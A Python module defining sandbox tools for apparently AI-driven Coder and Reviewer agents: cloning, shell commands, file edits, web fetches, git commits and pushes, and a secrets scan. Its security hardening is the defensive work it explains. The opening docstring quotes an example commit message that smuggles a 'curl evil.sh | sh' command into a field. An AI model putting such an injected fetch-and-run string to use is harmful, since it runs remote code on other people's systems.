"""
Sandbox tools exposed to the Coder and Reviewer agents.

Three properties this layer has to hold, none of which the previous version did:

1. **The GitHub token never enters a command string.** It was previously baked
   into the clone and push remote (`https://x-access-token:TOKEN@github.com/...`),
   which git echoes back in its own error messages — and every byte of tool
   output is streamed to browsers and written to Postgres. The token now travels
   as a process environment variable consumed by a git credential helper, and
   never lands in `.git/config`.

2. **Model-supplied strings are never concatenated into a shell command.** A
   commit message of `x'; curl evil.sh | sh; #` used to execute. Everything goes
   through `shlex.quote`, and the two tools that ran generated Python source now
   read their argument from the environment instead of interpolating it.

3. **The diff the Reviewer sees is the real one.** `git diff HEAD` runs *after*
   the Coder commits, so it was always empty and the Reviewer approved a change
   it had never seen. The base commit is recorded at clone time and the diff is
   taken against it.
"""

from __future__ import annotations

import shlex
from dataclasses import dataclass

from langchain_core.tools import tool

from app.config import settings
from app.core.logging import get_logger
from app.core.redaction import redact
from app.tools.sandbox import SandboxHandle, close_sandbox, registry

logger = get_logger(__name__)

WORKSPACE = "/workspace"
MAX_OUTPUT_CHARS = 20_000

# A git credential helper that answers from the environment. The token is never
# written to disk and never appears in a command line or a remote URL.
GIT_CREDENTIAL_HELPER = '!f() { echo "username=x-access-token"; echo "password=$GH_TOKEN"; }; f'

__all__ = ["close_sandbox", "detect_project_type", "make_e2b_tools"]


@dataclass(frozen=True)
class CommandResult:
    stdout: str
    stderr: str
    exit_code: int

    @property
    def ok(self) -> bool:
        return self.exit_code == 0

    def render(self) -> str:
        parts = []
        if self.stdout.strip():
            parts.append(f"stdout:\n{self.stdout.strip()}")
        if self.stderr.strip():
            parts.append(f"stderr:\n{self.stderr.strip()}")
        parts.append(f"exit_code: {self.exit_code}")
        return redact("\n".join(parts))[:MAX_OUTPUT_CHARS]


def _safe_relpath(path: str) -> str:
    """
    Normalise an agent-supplied path to something inside the workspace.

    Rejects traversal outright rather than silently clamping, so a confused
    model gets a corrective error instead of writing to an unexpected location.
    """
    cleaned = path.strip().lstrip("/")
    if cleaned.startswith("workspace/"):
        cleaned = cleaned[len("workspace/") :]
    if not cleaned:
        raise ValueError("path must not be empty")
    parts = [p for p in cleaned.replace("\\", "/").split("/") if p not in ("", ".")]
    if any(p == ".." for p in parts):
        raise ValueError(f"path escapes the workspace: {path!r}")
    return "/".join(parts)


def detect_project_type(listing: str) -> str:
    """
    Classify a repository from its root listing.

    Split out and made exact-match so it is unit-testable. The old version did
    substring checks against a lowercased blob, so a directory named
    `package.json.d` or a README mentioning `go.mod` changed the build system.
    """
    entries = {line.strip() for line in listing.splitlines() if line.strip()}
    lowered = {e.lower() for e in entries}

    if "pom.xml" in lowered:
        return "maven"
    if {"build.gradle", "build.gradle.kts"} & lowered:
        return "gradle"
    if "cargo.toml" in lowered:
        return "rust"
    if "go.mod" in lowered:
        return "go"
    if {"requirements.txt", "pyproject.toml", "setup.py", "setup.cfg"} & lowered:
        return "python"
    if "package.json" in lowered:
        return "node"
    return "unknown"


def make_e2b_tools(*, run_id: str, token: str, owner: str, repo: str) -> list:
    """Build the sandbox toolset bound to one run's sandbox and repository."""

    repo_url = f"https://github.com/{owner}/{repo}.git"

    def _handle() -> SandboxHandle:
        return registry.get_or_create(run_id)

    def _run(
        command: str,
        *,
        timeout: int | None = None,
        cwd: str | None = WORKSPACE,
        with_token: bool = False,
    ) -> CommandResult:
        """
        Execute one command in the sandbox.

        `with_token` injects GH_TOKEN into the process environment for git
        operations. It is passed as an env var, never as part of `command`.
        """
        handle = _handle()
        sandbox = handle.sandbox
        envs = {"GH_TOKEN": token} if with_token else None
        full = f"cd {shlex.quote(cwd)} && {command}" if cwd else command

        try:
            kwargs: dict = {"timeout": timeout or settings.SANDBOX_COMMAND_TIMEOUT_SECONDS}
            if envs:
                kwargs["envs"] = envs
            result = sandbox.commands.run(full, **kwargs)  # type: ignore[attr-defined]
            return CommandResult(
                stdout=result.stdout or "",
                stderr=result.stderr or "",
                exit_code=int(result.exit_code or 0),
            )
        except Exception as exc:
            # E2B raises on non-zero exit and carries the streams on the
            # exception. A failed command is normal agent input, not a crash.
            return CommandResult(
                stdout=str(getattr(exc, "stdout", "") or ""),
                stderr=str(getattr(exc, "stderr", "") or redact(str(exc))),
                exit_code=int(getattr(exc, "exit_code", 1) or 1),
            )

    def _run_python(script: str, env: dict[str, str], timeout: int) -> str:
        """
        Run a generated Python script with its inputs supplied via environment.

        Interpolating an agent-controlled string into source text is arbitrary
        code execution; `os.environ` keeps data and code separate.
        """
        handle = _handle()
        # Inside the disposable E2B sandbox, not the host filesystem.
        path = "/tmp/_swarm_task.py"  # noqa: S108
        handle.sandbox.files.write(path, script)  # type: ignore[attr-defined]
        assignments = " ".join(f"{k}={shlex.quote(v)}" for k, v in env.items())
        return _run(f"{assignments} python3 {path}", timeout=timeout, cwd=None).render()

    def _git(args: str, *, timeout: int | None = None) -> CommandResult:
        """Run git with the environment-backed credential helper configured."""
        helper = shlex.quote(GIT_CREDENTIAL_HELPER)
        return _run(f"git -c credential.helper={helper} {args}", timeout=timeout, with_token=True)

    # ------------------------------------------------------------------ #
    @tool
    def setup_workspace() -> str:
        """
        Clone the repository into the sandbox and install its dependencies.
        Must be the first sandbox tool called in a run.
        """
        handle = _handle()
        already = _run(f"test -d {WORKSPACE}/.git && echo GIT_OK || echo NO_GIT", cwd=None)
        if "GIT_OK" in already.stdout:
            return f"Workspace already prepared at {WORKSPACE} (reusing the existing clone)."

        last: CommandResult | None = None
        for attempt in range(1, 4):
            _run(f"rm -rf {WORKSPACE} && mkdir -p {WORKSPACE}", cwd=None)
            last = _git(f"clone --depth 50 {shlex.quote(repo_url)} {WORKSPACE}", timeout=180)
            verify = _run(f"test -d {WORKSPACE}/.git && echo GIT_OK || echo NO_GIT", cwd=None)
            if "GIT_OK" in verify.stdout:
                break
            logger.warning("Clone attempt %d failed for %s/%s", attempt, owner, repo)
            _run("sleep 4", cwd=None)
        else:
            return f"CLONE FAILED after 3 attempts.\n{last.render() if last else ''}"

        _run('git config user.email "swarm@devops-swarm.local"')
        _run('git config user.name "DevOps Swarm"')

        # Record the pre-change commit so the Reviewer can diff against it.
        head = _run("git rev-parse HEAD")
        if head.ok:
            handle.base_commit = head.stdout.strip()

        listing = _run("ls -1").stdout
        project = detect_project_type(listing)

        install = {
            "python": ("pip install -r requirements.txt -q 2>&1 || pip install -e . -q 2>&1", 300),
            "node": ("npm install --no-audit --no-fund 2>&1 | tail -20", 300),
            "go": ("go mod download 2>&1", 180),
            "rust": ("cargo fetch 2>&1 | tail -20", 300),
            "maven": ("mvn -q -B dependency:go-offline 2>&1 | tail -20", 300),
            "gradle": ("gradle dependencies --offline 2>&1 | tail -20", 300),
        }.get(project)

        summary = (
            f"Cloned {owner}/{repo} (detected: {project}) at commit {handle.base_commit or '?'}."
        )
        if install is None:
            return f"{summary} No dependency manifest found — ready to code."
        cmd, timeout = install
        return f"{summary}\n{_run(cmd, timeout=timeout).render()}"

    # ------------------------------------------------------------------ #
    @tool
    def run_command(command: str) -> str:
        """
        Run a shell command inside the workspace.
        Args:
            command: Shell command to execute, e.g. 'pytest tests/ -v'
        """
        return _run(command).render()

    # ------------------------------------------------------------------ #
    @tool
    def read_file(path: str) -> str:
        """
        Read a file from the workspace.
        Args:
            path: Path relative to the repository root, e.g. 'src/auth.py'
        """
        try:
            rel = _safe_relpath(path)
        except ValueError as exc:
            return f"ERROR: {exc}"
        try:
            content = _handle().sandbox.files.read(f"{WORKSPACE}/{rel}")  # type: ignore[attr-defined]
            return redact(str(content))[:MAX_OUTPUT_CHARS]
        except Exception as exc:
            return f"ERROR reading {rel}: {redact(str(exc))}"

    # ------------------------------------------------------------------ #
    @tool
    def write_file(path: str, content: str) -> str:
        """
        Create or overwrite a file in the workspace.
        Args:
            path: Path relative to the repository root, e.g. 'src/auth.py'
            content: Complete file content
        """
        try:
            rel = _safe_relpath(path)
        except ValueError as exc:
            return f"ERROR: {exc}"
        try:
            _handle().sandbox.files.write(f"{WORKSPACE}/{rel}", content)  # type: ignore[attr-defined]
            lines = content.count("\n") + 1
            return f"Wrote {rel} ({len(content)} bytes, {lines} lines)."
        except Exception as exc:
            return f"ERROR writing {rel}: {redact(str(exc))}"

    # ------------------------------------------------------------------ #
    @tool
    def list_files(path: str = "") -> str:
        """
        List the contents of a directory in the workspace.
        Args:
            path: Directory relative to the repository root; empty for the root.
        """
        try:
            rel = _safe_relpath(path) if path.strip() else ""
        except ValueError as exc:
            return f"ERROR: {exc}"
        target = f"{WORKSPACE}/{rel}" if rel else WORKSPACE
        result = _run(f"ls -1Ap {shlex.quote(target)}", cwd=None)
        return result.stdout.strip() or "(empty)"

    # ------------------------------------------------------------------ #
    @tool
    def find_in_files(pattern: str, file_extensions: str = "py,js,ts,tsx,go,java,rs") -> str:
        """
        Search the workspace for a pattern. Use this to match the repository's
        existing conventions before writing new code.
        Args:
            pattern: Literal string or regex to search for, e.g. 'def authenticate'
            file_extensions: Comma-separated extensions to search
        """
        includes = " ".join(
            f"--include={shlex.quote('*.' + ext.strip().lstrip('.'))}"
            for ext in file_extensions.split(",")
            if ext.strip()
        )
        result = _run(
            f"grep -rnI {includes} --exclude-dir=.git --exclude-dir=node_modules "
            f"--exclude-dir=.venv -e {shlex.quote(pattern)} . | head -60"
        )
        return result.stdout.strip() or f"No matches for {pattern!r}."

    # ------------------------------------------------------------------ #
    @tool
    def search_web(query: str) -> str:
        """
        Search the web for documentation, library APIs, or error explanations.
        Args:
            query: Search terms, e.g. 'fastapi rate limiting middleware'
        """
        script = """
import json, os, urllib.parse, urllib.request

query = os.environ["SWARM_QUERY"]
url = "https://api.duckduckgo.com/?" + urllib.parse.urlencode(
    {"q": query, "format": "json", "no_html": "1", "skip_disambig": "1"}
)
try:
    req = urllib.request.Request(url, headers={"User-Agent": "DevOpsSwarm/2.0"})
    with urllib.request.urlopen(req, timeout=12) as response:
        data = json.loads(response.read())
except Exception as exc:
    raise SystemExit(f"Search failed: {exc}. Try fetch_url() with a direct link.")

out = []
if data.get("Abstract"):
    out.append("SUMMARY: " + data["Abstract"])
    if data.get("AbstractURL"):
        out.append("Source: " + data["AbstractURL"])
if data.get("Answer"):
    out.append("ANSWER: " + str(data["Answer"]))
for topic in data.get("RelatedTopics", [])[:6]:
    if isinstance(topic, dict) and topic.get("Text"):
        out.append("- " + topic["Text"][:300])
        if topic.get("FirstURL"):
            out.append("  " + topic["FirstURL"])
print("\\n".join(out) or "No instant answer. Use fetch_url() with a specific documentation URL.")
"""
        return _run_python(script, {"SWARM_QUERY": query}, timeout=25)

    # ------------------------------------------------------------------ #
    @tool
    def fetch_url(url: str) -> str:
        """
        Fetch a URL and return its readable text. Use for official documentation.
        Args:
            url: Full https URL
        """
        if not url.lower().startswith(("http://", "https://")):
            return "ERROR: url must start with http:// or https://"
        script = """
import html, os, re, urllib.request

url = os.environ["SWARM_URL"]
req = urllib.request.Request(url, headers={"User-Agent": "DevOpsSwarm/2.0"})
try:
    with urllib.request.urlopen(req, timeout=15) as response:
        raw = response.read().decode("utf-8", errors="replace")
except Exception as exc:
    raise SystemExit(f"Failed to fetch: {exc}")

text = re.sub(r"<(script|style)[^>]*>.*?</\\1>", " ", raw, flags=re.DOTALL | re.IGNORECASE)
text = re.sub(r"<[^>]+>", " ", text)
text = re.sub(r"[ \\t]+", " ", html.unescape(text))
text = re.sub(r"\\n\\s*\\n+", "\\n\\n", text).strip()
print(text[:6000] if text else "Page returned no readable text.")
"""
        return _run_python(script, {"SWARM_URL": url}, timeout=30)

    # ------------------------------------------------------------------ #
    @tool
    def install_package(package_name: str) -> str:
        """
        Install a dependency in the sandbox. Use after an import error.
        Args:
            package_name: Single package name, e.g. 'pytest-asyncio'
        """
        # A package name is an identifier, not a command fragment.
        if not package_name or not all(c.isalnum() or c in "-_.@/[]<>=~! " for c in package_name):
            return f"ERROR: refusing to install suspicious package name {package_name!r}"
        project = detect_project_type(_run("ls -1").stdout)
        quoted = shlex.quote(package_name.strip())
        if project == "node":
            return _run(
                f"npm install {quoted} --no-audit --no-fund 2>&1 | tail -20", timeout=180
            ).render()
        return _run(f"pip install {quoted} -q 2>&1 | tail -20", timeout=180).render()

    # ------------------------------------------------------------------ #
    @tool
    def run_linter() -> str:
        """
        Lint the workspace to catch syntax errors and unused imports.
        Always run this before git_commit_all().
        """
        project = detect_project_type(_run("ls -1").stdout)
        if project == "python":
            _run("pip install ruff -q 2>&1", timeout=120)
            return _run("ruff check . --output-format=concise 2>&1 | head -60").render()
        if project == "node":
            return _run(
                "npx --no-install eslint . 2>&1 | head -60 || "
                "echo 'eslint not configured; skipping'"
            ).render()
        if project == "go":
            return _run("go vet ./... 2>&1 | head -60").render()
        if project == "rust":
            return _run("cargo check 2>&1 | tail -60", timeout=300).render()
        if project in ("maven", "gradle"):
            return _run(
                "find . -name '*.java' -print0 | xargs -0 javac -d /tmp/lint 2>&1 | head -60"
            ).render()
        return f"No linter configured for project type '{project}' — skipped."

    # ------------------------------------------------------------------ #
    @tool
    def get_git_diff() -> str:
        """
        Show every change made during this run, including already-committed ones.
        This is the authoritative view of what the Coder produced.
        """
        base = _handle().base_commit
        if base:
            # Committed work plus anything still in the working tree.
            committed = _run(f"git diff {shlex.quote(base)}..HEAD 2>&1")
            uncommitted = _run("git diff HEAD 2>&1")
            sections = []
            if committed.stdout.strip():
                sections.append(f"=== Committed since {base[:7]} ===\n{committed.stdout}")
            if uncommitted.stdout.strip():
                sections.append(f"=== Uncommitted working tree ===\n{uncommitted.stdout}")
            if sections:
                return redact("\n\n".join(sections))[:MAX_OUTPUT_CHARS]
            return "No changes relative to the base commit."
        # No recorded base: fall back to the last commit plus the working tree.
        return _run("git show --stat HEAD 2>&1 && git diff HEAD 2>&1").render()

    # ------------------------------------------------------------------ #
    @tool
    def run_tests() -> str:
        """
        Detect and run the project's test suite.
        On ModuleNotFoundError, call install_package() and run this again.
        """
        project = detect_project_type(_run("ls -1").stdout)
        command = {
            "maven": ("mvn -B test 2>&1 | tail -60", 600),
            "gradle": ("gradle test --console=plain 2>&1 | tail -60", 600),
            "python": ("python -m pytest --tb=short -q 2>&1 | tail -80", 600),
            "node": ("npm test --silent 2>&1 | tail -60", 600),
            "go": ("go test ./... 2>&1 | tail -60", 600),
            "rust": ("cargo test 2>&1 | tail -60", 600),
        }.get(project)

        if command is None:
            has_tests = _run(
                "find . -path ./node_modules -prune -o "
                "\\( -name 'test_*.py' -o -name '*_test.go' -o -name '*.test.ts' \\) -print "
                "| head -1"
            )
            if not has_tests.stdout.strip():
                return (
                    "NO_TESTS_FOUND: this repository has no recognised test suite. "
                    "Verify your change compiles with run_linter() instead."
                )
            return _run("python -m pytest --tb=short -q 2>&1 | tail -80", timeout=600).render()

        cmd, timeout = command
        return _run(cmd, timeout=timeout).render()

    # ------------------------------------------------------------------ #
    @tool
    def git_commit_all(message: str) -> str:
        """
        Stage every change and commit it.
        Args:
            message: Conventional-commit message, e.g. 'feat: add rate limiting'
        """
        staged = _run("git add -A && git diff --cached --stat")
        if not staged.stdout.strip():
            return "Nothing to commit — the working tree matches HEAD."
        # shlex.quote is what stops a crafted message from running commands.
        result = _run(f"git commit -m {shlex.quote(message.strip() or 'chore: swarm changes')}")
        return result.render()

    # ------------------------------------------------------------------ #
    @tool
    def git_push(branch: str) -> str:
        """
        Push the run's commits to a remote branch.
        Args:
            branch: Remote branch name, e.g. 'swarm/issue-5-add-rate-limiting'
        """
        if not branch or any(c in branch for c in " \t\n;&|$`"):
            return f"ERROR: invalid branch name {branch!r}"
        result = _git(
            f"push {shlex.quote(repo_url)} HEAD:refs/heads/{shlex.quote(branch)} --force-with-lease",
            timeout=180,
        )
        if result.ok:
            return f"Pushed to {owner}/{repo}:{branch}."
        return result.render()

    # ------------------------------------------------------------------ #
    @tool
    def run_security_scan() -> str:
        """
        Scan the workspace for hardcoded credentials and common vulnerability
        patterns. Run this before approving a change.
        """
        project = detect_project_type(_run("ls -1").stdout)
        sections: list[str] = []

        if project == "python":
            _run("pip install bandit -q 2>&1", timeout=120)
            bandit = _run(
                "bandit -r . -ll -f txt --exclude ./.git,./node_modules,./.venv 2>&1 | head -80"
            )
            sections.append(f"=== bandit (Python) ===\n{bandit.stdout.strip() or 'clean'}")

        if project == "node":
            audit = _run("npm audit --audit-level=high 2>&1 | head -40", timeout=180)
            sections.append(f"=== npm audit ===\n{audit.stdout.strip() or 'clean'}")

        secrets = _run(
            "grep -rnIE --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=.venv "
            "--include='*.py' --include='*.js' --include='*.ts' --include='*.go' "
            "--include='*.java' --include='*.rs' "
            + shlex.quote(
                r"(password|passwd|secret|api_?key|access_?token|private_?key)"
                r"\s*[:=]\s*['\"][^'\"]{8,}['\"]"
            )
            + " . | grep -viE '(example|placeholder|your_|xxx|dummy|fake|test_)' | head -25"
        )
        found = secrets.stdout.strip()
        sections.append(
            f"=== Hardcoded credentials ===\n{found}"
            if found
            else "=== Hardcoded credentials ===\nnone detected"
        )
        return redact("\n\n".join(sections))[:MAX_OUTPUT_CHARS]

    return [
        setup_workspace,
        run_command,
        read_file,
        write_file,
        list_files,
        find_in_files,
        search_web,
        fetch_url,
        install_package,
        run_linter,
        get_git_diff,
        run_tests,
        git_commit_all,
        git_push,
        run_security_scan,
    ]
